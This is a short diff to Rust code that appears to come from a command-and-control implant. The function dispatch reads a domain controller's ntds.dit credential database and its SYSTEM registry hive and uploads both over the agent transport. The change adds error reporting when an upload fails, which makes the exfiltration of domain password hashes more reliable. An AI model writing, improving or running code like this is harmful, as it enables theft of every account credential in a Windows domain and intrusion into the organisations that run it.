@@ -2423,7 +2423,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             if dc_err.is_empty() {
                 for (fp, nm) in [(&ntds_path, "ntds.dit"), (&sys_path, "SYSTEM")] {
                     match std::fs::read(fp) {
-                        Ok(data) => t.upload_file(task.id, nm, &data),
+                        Ok(data) => {
+                            if !t.upload_file(task.id, nm, &data) {
+                                dc_err.push_str(&format!("upload {} failed; ", nm));
+                            }
+                        }
                         Err(e) => dc_err.push_str(&format!("read {}: {}; ", fp, e)),
                     }
                 }
